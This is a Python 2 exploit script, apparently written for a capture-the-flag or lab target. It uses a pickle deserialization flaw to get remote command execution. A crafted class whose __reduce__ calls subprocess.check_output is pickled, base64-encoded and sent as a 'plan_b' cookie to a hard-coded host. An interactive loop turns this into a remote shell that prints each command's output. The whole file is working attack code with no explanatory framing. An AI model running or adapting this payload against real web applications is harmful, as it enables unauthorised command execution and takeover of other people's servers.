#!/usr/bin/env python2
import pickle
from base64 import b64decode, b64encode
import requests
import subprocess
from bs4 import BeautifulSoup

class anti_pickle_serum(object):
  """
  Uses the server-side pickl-ing class to construct arbitrary 
  commmands and achieve RCE
  """
  def __init__(self, commands):
    self.commands = [command for command in commands.split(' ')]

  def __reduce__(self):
    return (subprocess.check_output, (self.commands, ))

def test_pickle(pickled_object):
  """
  Test that the pickled_objects would [likely] be appropriately ingested by
  the webserver.
  """
  decoded_pickled_object = b64decode(pickled_object)
  unpickled_object = pickle.loads(decoded_pickled_object)
  return unpickled_object

def request_to_pickle_place(url, cookie):
  pickle_place_headers = {'Cookie': 'plan_b={0}'.format(cookie)}
  proxy = {'http': 'http://127.0.0.1:8080'}
  pickle_response = requests.get(url, headers=pickle_place_headers, verify=False)
  if proxy:
    pickle_response = requests.get(url, headers=pickle_place_headers, verify=False, proxies=proxy)
  content = BeautifulSoup(pickle_response.content, features="html.parser")
  try:
    span_tags = content.find_all('span')
    print(str(span_tags[0])[48:].split('</span>')[0])
  except IndexError:
    print('Command had an issue running.')
    print("Out of index range.")

def pickle_to_cookie(command):
  pickled_object = pickle.dumps({'serum': anti_pickle_serum(command)})
  encoded_pickle = b64encode(pickled_object)
  return encoded_pickle

if __name__ == "__main__":

  while True:
    commands = str(raw_input('> '))
    pickle_payload = pickle_to_cookie(commands)
    pickled_cookie = pickle_payload
    # Changes each time the target system is booted
    url = 'http://94.237.62.195:40908'
    request_to_pickle_place(url, pickled_cookie)
